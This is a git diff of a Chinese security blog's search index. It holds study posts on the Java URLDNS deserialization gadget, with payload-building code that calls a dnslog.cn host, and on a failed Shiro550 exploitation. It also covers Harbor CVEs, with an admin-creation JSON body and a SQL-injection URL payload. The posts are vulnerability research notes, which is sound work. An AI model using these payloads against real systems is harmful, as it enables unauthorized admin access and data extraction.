-<p>在看鸿蒙发布会时，终于想明白了，现在我们知道当 HashMap 传入一个URL对象时，会进行一次DNS解析，并且HashMap 实现了<code>Serializable</code> 接口，重写了 <code>readObject</code>，也就是说当一个Java应用存在反序列化漏洞时，我们可以通过传入一个序列化后的HashMap数据(将URL对象作为key放入HashMap)，当我们传入的数据到达该Java应用的反序列化漏洞点时,这时程序就会调用 HashMap 重写的<strong>readObject</strong> 函数来反序列化读取数据，也就是上述分析过程，然后就会触发 key.hashCode() 函数，进行一次DNS解析。</p>
-<h3 id="2-5-至善至美"><a href="#2-5-至善至美" class="headerlink" title="2.5 至善至美"></a>2.5 至善至美</h3><p>到上面已经可以作为漏洞探测了，但是 ysoserial 项目中有其他代码，我们可以看看具体是什么情况</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084516.png" alt="image-20210603214336126"></p>
-<p>这里通过继承 <code>URLStreamHandler</code> 类，重写了<code>openConnection</code> 和 <code>getHostAddress</code> 函数，然后</p>
-<p>将handler在创建URL时传入，其实这个传入的handler就是hashCode函数中的handler</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084530.png" alt="image-20210602172051929"></p>
-<p>前面提到过，HashMap#put 时也会调用 <strong>getHostAddress</strong> 函数进行一次DNS解析，这里就是通过重写的 <strong>getHostAddress</strong> 函数覆盖掉原来的函数，不进行DNS解析，防止在payload创建期间进行DNS解析，也就是一个防干扰功能。</p>
-<p>接下来看看 **Reflections.setFieldValue(u, “hashCode”, -1); <strong>这一行代码。Reflections</strong>类是 ysoserial 写的一个反射类<code>src/main/java/ysoserial/payloads/util/Reflections.java</code>，这是 <code>setFieldValue</code>函数</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">   field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">	    field = clazz.getDeclaredField(fieldName);</span><br><span class="line">	    setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> field;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p>之前在前置知识 <a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484123&idx=1&sn=598d098ffe19be59547c09538716e196&chksm=c2829bc2f5f512d4e77af3085132c9cf18d9b2fec5abc1c0f6a120561d52be43be29ff0b2a92&scene=21#wechat_redirect">初探Java反序列化漏洞(二)</a>中讲到过反射, 上述代码就是通过反射来设置 URL 类的 hashCode的值为-1，这是因为在 HashMap#put 时，已经调用过一次hashCode() 函数，这时 hashCode的值就会改变，不再为-1，让其进行下一步执行DNS解析。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084535.png" alt="image-20210602211410050"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084542.png" alt="image-20210602211523937"></p>
-<p>那也就是说在下一步经过HashMap的<strong>readObject</strong>函数反序列化时, 因为此时 <code>hashCode != -1</code> ,会直接返回hashCode的值，不再进行调用 handler.hashCode(this) 。因此使用 <code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); </code> 反射将 <strong>hashCode</strong>的值设为 <strong>-1</strong>。</p>
-<p>之后通过<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084549.png" alt="image-20210604082305067"> 执行序列化操作</p>
-<h2 id="0x03-代码模拟"><a href="#0x03-代码模拟" class="headerlink" title="0x03 代码模拟"></a>0x03 代码模拟</h2><p>我们来手动复原一下</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/2 16:21</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 put 时不发起 dns 解析</span></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlDNSTest</span>.SilentURLStreamHandler();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://atysqv.dnslog.cn&quot;</span>, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射将put之后 hashCode 的 值重新赋值为 -1</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        f.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过序列化，发现确实没有在payload生成阶段发起dns解析。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084603.png" alt="image-20210604082455201"></p>
-<p>接下来我们通过读取<code>out.bin</code> 文件将其反序列化来模拟漏洞点，</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">// 反序列化读取 out.bin 文件</span></span><br><span class="line">       <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">       ois.readObject();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084609.png" alt="image-20210604082654765">请求成功。</p>
-<p>最后回顾一下整个流程:			</p>
-<pre><code>1. 将URL对象作为key放入hashMap中，将其序列化发送给目标机器
-2. 如果目标机器存在反序列化漏洞，那么会执行`HashMap.readObject()` 将数据反序列化
-3. 在反序列化期间，为了还原hashmap的内容，会调用 `hash()` 方法，而`hash()`函数会调用传入参数的 `hashCode()`方法
-4. 当URL 对象的 `hashCode`属性值为 `-1` 时会调用 `handler.hashCode()`方法，而这个方法会进行一次DNS查询。
-</code></pre>
-<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.gettoby.com/p/hk4t4bb9qttz">https://www.gettoby.com/p/hk4t4bb9qttz</a></p>
+<p>别人在环境中引入了<code>commons-collections4.0</code>，使得ysoserial的<code>CommonsCollections2</code>利用链可以成功利用。这是因为<code>CommonsCollections2</code>用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令。（后续学习这条链）</p>
+<h2 id="0x01-构造新的利用链"><a href="#0x01-构造新的利用链" class="headerlink" title="0x01 构造新的利用链"></a>0x01 构造新的利用链</h2><p>我不会。。。 看半天还是没看懂，前置知识缺的有点多，直接放链接吧</p>
+<p><a href="https://www.anquanke.com/post/id/192619#h2-3">https://www.anquanke.com/post/id/192619#h2-3</a> </p>
+<p>总结就是利用链中的<code>ChainedTransformer</code>这个类的利用是无法成功的，因为它的类属性<code>iTransformers</code>是数组类型的<code>Transformers</code>，最终通过使用<code>TemplatesImpl.newTransformer</code>函数来动态<code>loadClass</code>构造好的evil class bytes</p>
+<p>通过大佬改造的<a href="https://github.com/wh1t3p1g/ysoserial">https://github.com/wh1t3p1g/ysoserial</a> CommonsCollections10 利用链打一下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210529212125.png" alt="image-20210527084745187"></p>
+<p>这个图<strong>又是假</strong>的，淦，用大佬的CC10链打了之后，突然怀疑之前的命令搞错了，我之前是用<code>whoami</code>测试的，我想起了mac命令执行不太一样，重新用<code>open -a Calculator</code>试了一遍，发现CC2链又可以成功了，瞬间凌乱（已经把添加的commons-collections4.0版本给注释了），这两天一直在重新测试找原因，通过重新下载shiro，切换版本重新来一遍，CC2并不可以打原生的shiro550，用大佬的CC10也打不出来，原因也找不到，前置知识缺的太多了，再搞下去也是浪费时间。</p>
+<p>最终找到我为啥可以打成功，因为我在<code>shiro/samples/web</code>目录下生成过war包，当时是在测试4.0版本RCE，生成的target目录没有删除，之后启动的时候应该都是使用target目录下的东西，即使去除4.0版本依旧没用，生成的war包并没有改变还是可以RCE的4.0版本，搞得我怀疑人生。还有说<strong>JRMP</strong> 这个<strong>Gadget</strong>可以打，也是废了，没成功。</p>
+<p>不搞了，心累，等补充完知识，再重新来吧</p>
+<p>接下来通过<a href="https://github.com/frohoff/ysoserial%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E5%90%A7%EF%BC%8C%E6%85%A2%E6%85%A2%E6%9D%A5%E5%90%A7%E3%80%82">https://github.com/frohoff/ysoserial这个项目来学习java反序列化的利用链吧，慢慢来吧。</a></p>
+<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>推荐一个Chrome插件—<strong>Toby for Chrome</strong>，适合舍不得关标签页，留待后续研究的。</p>
+<p>中途参考的文章太多了，就用这个插件生成的分享链接吧</p>
+<p><a href="https://www.gettoby.com/p/m9955hzbsf6s">https://www.gettoby.com/p/m9955hzbsf6s</a></p>
 ]]></content>
       <categories>
         <category>漏洞原理</category>
@@ -715,48 +757,6 @@
       </categories>
       <tags>
         <tag>GitHub工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java反序列化漏洞分析(二)-Shiro550</title>
-    <url>/2021/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BA%8C)-Shiro550/</url>
-    <content><![CDATA[<blockquote>
-<p>  这是一篇失败的文章，要学的东西太多了，高看我自己了。终究是纸上得来终觉浅，绝知此事要躬行</p>
-</blockquote>
-<h2 id="0x00-纠错"><a href="#0x00-纠错" class="headerlink" title="0x00 纠错"></a>0x00 纠错</h2><p>首先纠正一下上篇文章<a href="">Java反序列化漏洞分析(一)-Shiro550</a>的错误错误，上篇提到dnslog使用原生环境搭建没有打成功，这是<strong>错的</strong>、<strong>错的</strong>、<strong>错的</strong>，其实是可以打的。我给搞错了，<strong>URLDNS</strong> 这个利用链本身不依赖于任何第三方库，同时不限制jdk的版本，所以通常是用来检测反序列化的点（目标出网），我当时没打成功，是因为我做实验时，用了<strong>同一条</strong>dnslog的url打过一遍，第二遍死活不出结果，写这篇文章时又测了几次，发现是url的锅，要不停的变换才会一直出结果<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210524215703.png" alt="原生的shiro550可以使用dnslog探测"></p>
-<blockquote>
-<p>  Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。</p>
-</blockquote>
-<h2 id="0x01-原生Shiro550执行命令"><a href="#0x01-原生Shiro550执行命令" class="headerlink" title="0x01 原生Shiro550执行命令"></a>0x01 原生Shiro550执行命令</h2><p>当使用<strong>URLDNS链</strong>打过去，在DNSLOG平台有回显的时候，就说明这个地方存在反序列化漏洞。</p>
-<p>但是要利用的话还得是使用CC链等利用链去进行命令的执行（shiro550中自带的是cc3.2.1版本的组件）。</p>
-<p>经过测试<strong>ysoserial</strong>拥有的CommonsCollections利用链从1-7都无法成功执行命令, 都是报错<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211912.png" alt="image-20210528211554019"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211926.png" alt="image-20210525211529910"></p>
-<p>无法反序列化一个数组，经常敲代码，修bug的都知道，报错的位置一般都在最下边的，去看看</p>
-<p><code>at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77)</code> 直接点过去看看<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211917.png" alt="image-20210526220345069"></p>
-<p>可以看到在<a href="">初探Java反序列化漏洞(一)</a>中提到的重点函数<strong>readObject()<strong>函数，但是又有一点点不一样，它这里是</strong>new</strong>了一个<strong>ClassResolvingObjectInputStream</strong>,而非传统的<strong>ObjectInputStream</strong> 问题就可能出现在这里，全局搜索看下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211939.png" alt="image-20210526220837880"></p>
-<p>这里是通过 <strong>ClassUtils.forName(osc.getName());<strong>来反射调用的，而前面都是通过</strong>Class.forName(“java.lang.Runtime”);</strong> 来进行反射执行命令的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211949.png" alt="image-20210526221020003"></p>
-<p>直接在这里下断点，然后使用CC2链打一下，调试半天也没看懂，太菜了，先记下 参考文章中说的是</p>
-<blockquote>
-<p>  Shiro resovleClass 使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
-</blockquote>
-<p>别人在环境中引入了<code>commons-collections4.0</code>，使得ysoserial的<code>CommonsCollections2</code>利用链可以成功利用。这是因为<code>CommonsCollections2</code>用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令。（后续学习这条链）</p>
-<h2 id="0x01-构造新的利用链"><a href="#0x01-构造新的利用链" class="headerlink" title="0x01 构造新的利用链"></a>0x01 构造新的利用链</h2><p>我不会。。。 看半天还是没看懂，前置知识缺的有点多，直接放链接吧</p>
-<p><a href="https://www.anquanke.com/post/id/192619#h2-3">https://www.anquanke.com/post/id/192619#h2-3</a> </p>
-<p>总结就是利用链中的<code>ChainedTransformer</code>这个类的利用是无法成功的，因为它的类属性<code>iTransformers</code>是数组类型的<code>Transformers</code>，最终通过使用<code>TemplatesImpl.newTransformer</code>函数来动态<code>loadClass</code>构造好的evil class bytes</p>
-<p>通过大佬改造的<a href="https://github.com/wh1t3p1g/ysoserial">https://github.com/wh1t3p1g/ysoserial</a> CommonsCollections10 利用链打一下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210529212125.png" alt="image-20210527084745187"></p>
-<p>这个图<strong>又是假</strong>的，淦，用大佬的CC10链打了之后，突然怀疑之前的命令搞错了，我之前是用<code>whoami</code>测试的，我想起了mac命令执行不太一样，重新用<code>open -a Calculator</code>试了一遍，发现CC2链又可以成功了，瞬间凌乱（已经把添加的commons-collections4.0版本给注释了），这两天一直在重新测试找原因，通过重新下载shiro，切换版本重新来一遍，CC2并不可以打原生的shiro550，用大佬的CC10也打不出来，原因也找不到，前置知识缺的太多了，再搞下去也是浪费时间。</p>
-<p>最终找到我为啥可以打成功，因为我在<code>shiro/samples/web</code>目录下生成过war包，当时是在测试4.0版本RCE，生成的target目录没有删除，之后启动的时候应该都是使用target目录下的东西，即使去除4.0版本依旧没用，生成的war包并没有改变还是可以RCE的4.0版本，搞得我怀疑人生。还有说<strong>JRMP</strong> 这个<strong>Gadget</strong>可以打，也是废了，没成功。</p>
-<p>不搞了，心累，等补充完知识，再重新来吧</p>
-<p>接下来通过<a href="https://github.com/frohoff/ysoserial%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E5%90%A7%EF%BC%8C%E6%85%A2%E6%85%A2%E6%9D%A5%E5%90%A7%E3%80%82">https://github.com/frohoff/ysoserial这个项目来学习java反序列化的利用链吧，慢慢来吧。</a></p>
-<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>推荐一个Chrome插件—<strong>Toby for Chrome</strong>，适合舍不得关标签页，留待后续研究的。</p>
-<p>中途参考的文章太多了，就用这个插件生成的分享链接吧</p>
-<p><a href="https://www.gettoby.com/p/m9955hzbsf6s">https://www.gettoby.com/p/m9955hzbsf6s</a></p>
-]]></content>
-      <categories>
-        <category>漏洞原理</category>
-      </categories>
-      <tags>
-        <tag>漏洞原理</tag>
       </tags>
   </entry>
   <entry>
@@ -1031,6 +1031,109 @@
       </categories>
       <tags>
         <tag>GitHub工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>harbor历史漏洞分析</title>
+    <url>/2023/02/18/harbor%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<blockquote>
+<p>  今年多写文章，先把去年的清理一下</p>
+</blockquote>
+<h1 id="Harbor"><a href="#Harbor" class="headerlink" title="Harbor"></a>Harbor</h1><p>Harbor是VMware公司开源的企业级Docker Registry项目，用来帮助用户迅速搭建一个企业级的Docker Registry服务。</p>
+<p>它以Docker公司开源的registry为基础，提供了管理UI，基于角色的访问控制(Role Based Access Control)，AD&#x2F;LDAP集成、以及审计日志(Auditlogging) 等企业用户需求的功能，同时还原生支持中文。</p>
+<h1 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h1><h2 id="CVE-2019-16097"><a href="#CVE-2019-16097" class="headerlink" title="CVE-2019-16097"></a>CVE-2019-16097</h2><p>漏洞版本 1.7.0 to 1.7.5 and 1.8.0 to 1.8.2</p>
+<blockquote>
+<p>Harbour 1.7.0 到 1.8.2 中的 <code>core/api/user.go</code> 允许非管理员用户通过 POST <code>/api/users</code> API 创建管理员帐户</p>
+</blockquote>
+<p>相关代码，直接解析传来的数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224677.png" alt="image-20221019141407512"></p>
+<p>正常注册数据</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;test123@gmai.com&quot;</span><span class="punctuation">,</span><span class="attr">&quot;realname&quot;</span><span class="punctuation">:</span><span class="string">&quot;noname&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;Password1@11&quot;</span><span class="punctuation">,</span><span class="attr">&quot;comment&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>非预期：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;test123@gmai.com&quot;</span><span class="punctuation">,</span><span class="attr">&quot;realname&quot;</span><span class="punctuation">:</span><span class="string">&quot;noname&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;Password1@11&quot;</span><span class="punctuation">,</span><span class="attr">&quot;comment&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;has_admin_role&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>has_admin_role</code> 代表是否为管理员，直接创建管理员用户</p>
+<p>修复代码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224489.png" alt="image-20221019141923017"></p>
+<h2 id="CVE-2019-16919"><a href="#CVE-2019-16919" class="headerlink" title="CVE-2019-16919"></a>CVE-2019-16919</h2><p>漏洞版本：1.8.0 to 1.8.3 and 1.9.0</p>
+<blockquote>
+<p>该漏洞允许项目管理员使用 Harbor API 创建一个机器人帐户，该帐户对他们无权访问或控制的项目具有未经授权的推送或拉取访问权限。Harbor API 没有对 API 请求强制执行适当的项目权限和项目范围以创建新的机器人帐户。</p>
+</blockquote>
+<p><code>src/core/api/robot.go</code>对比，就是加了一个判断，需要管理员创建没啥说的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224173.png" alt="image-20221019144856634"></p>
+<p><a href="https://github.com/goharbor/harbor/commit/debf63bcbd17bbeacb4a354de0457684f4ecaa5a">https://github.com/goharbor/harbor/commit/debf63bcbd17bbeacb4a354de0457684f4ecaa5a</a></p>
+<h2 id="CVE-2019-19023"><a href="#CVE-2019-19023" class="headerlink" title="CVE-2019-19023"></a>CVE-2019-19023</h2><p>漏洞版本 1.7.*, 1.8.*, &lt; 1.9.3</p>
+<blockquote>
+<p>  该漏洞允许普通用户通过调用 API 来修改特定用户的电子邮件地址，从而获得管理员帐户权限。之后重置该电子邮件地址的密码并访问该帐户。</p>
+</blockquote>
+<p><code>src/core/api/user.go</code>修复前后对比</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224226.png" alt="image-20221019163318792"></p>
+<p>修复前是先赋值，后将用户输入转换为 json，这时 <code>userID</code> 就会被覆盖修改为用户输入的 id，可控，这样就可以修改管理员的邮箱，之后再进行重置密码操作，登录管理员；</p>
+<p>修复后是先转换，后赋值，<code>userID</code>还是当前登录用户的id，不可控；</p>
+<h2 id="cve-2019-xxx"><a href="#cve-2019-xxx" class="headerlink" title="cve-2019-xxx"></a>cve-2019-xxx</h2><p>CVE-2019-3990、CVE-2020-13794 非管理员可以进行用户名枚举,</p>
+<p>CVE-2019-19025 没有 csrf 保护</p>
+<p>CVE-2019-19030 未授权信息探测</p>
+<p>1.7.*, 1.8.*, 1.9.*, &lt;2.0.1</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/api/chartrepo/&#123;repo&#125;/prov (POST)</span><br><span class="line">/api/chartrepo/&#123;repo&#125;/charts (GET, POST)</span><br><span class="line">/api/chartrepo/&#123;repo&#125;/charts/&#123;name&#125; (GET, DELETE)</span><br><span class="line">/api/chartrepo/&#123;repo&#125;/charts/&#123;name&#125;/&#123;version&#125; (GET, DELETE)</span><br><span class="line">/api/labels?name=&#123;name&#125;&amp;scope=p (GET)</span><br><span class="line">/api/repositories?project_id=&#123;id&#125; (GET)</span><br><span class="line">/api/repositories/&#123;repo_name&#125;/ (GET, PUT, DELETE)</span><br><span class="line">/api/repositories/&#123;repo_name&#125;/tags (GET)</span><br><span class="line">/api/repositories/&#123;repo_name&#125;/tags/&#123;tag&#125;/manifest?version=&#123;version&#125; (GET)</span><br><span class="line">/api/repositories/&#123;repo_name/&#123;tag&#125;/labels (GET)</span><br><span class="line">/api/projects?project_name=&#123;name&#125; (HEAD)</span><br><span class="line">/api/projects/&#123;project_id&#125;/summary (GET)</span><br><span class="line">/api/projects/&#123;project_id&#125;/logs (GET)</span><br><span class="line">/api/projects/&#123;project_id&#125; (GET, PUT, DELETE)</span><br><span class="line">/api/projects/&#123;project_id&#125;/metadatas (GET, POST)</span><br><span class="line">/api/projects/&#123;project_id&#125;/metadatas/&#123;metadata_name&#125; (GET, PUT)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CVE-2019-19026"><a href="#CVE-2019-19026" class="headerlink" title="CVE-2019-19026"></a>CVE-2019-19026</h2><p>漏洞版本： 1.7.*、&lt;1.8.6、&lt;1.9.3</p>
+<blockquote>
+<p>  Harbor API的配额部分中存在SQL注入漏洞。经过身份验证的管理员可以通过GET参数排序发送巧尽心思构建的SQL负载，从而允许从数据库中提取敏感信息。</p>
+<p>  Ps : 官方版本说的根本不对，quota_usage 这个文件 1.9.0 才出现</p>
+</blockquote>
+<p><code>git checkout v1.9.0</code></p>
+<p><code>src/common/dao/quota.go</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224706.png" alt="image-20221024105920943"></p>
+<p>Payload </p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://xxxxxx/api/quotas?reference=project&amp;page=1&amp;page_size=15&amp;sort=used.count%27%7C%7C(case+when+version()like+%27Postgre%25%27+then+1+else+(select+1+union+select+2)+end)%7C%7C%27</span><br></pre></td></tr></table></figure>
+
+<h3 id="CodeQL"><a href="#CodeQL" class="headerlink" title="CodeQL"></a>CodeQL</h3><p>生成数据库<code>codeql database create ./harbor1.9.0 -s /Users/yhy/Documents/CloudNative/harbor/code/harbor/src --language=go</code> ps: 要指定源文件为 src 目录下，虽然上级目录有 makefile，但生成时没有运行 makefile，导致生成后的数据库有问题,sink 点缺失很多。</p>
+<p>还有就是 Harbor 使用的是<code>beego</code>框架，该框架有两个版本，Codeql 中的<code>BeegoOrm</code>只写了一种，在<code>go/ql/lib/semmle/go/frameworks/BeegoOrm.qll</code>添加如下代码:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224894.png" alt="image-20221201200001309"></p>
+<p>使用官方的<code>ql/src/Security/CWE-089/SqlInjection.ql</code>查询规则，sink 和 source 单独都能跑出来，但是结合到一起，无法找出注入点，经分析大概是因为<code>...</code>造成数据流中断</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182225738.png" alt="image-20221025221621454"></p>
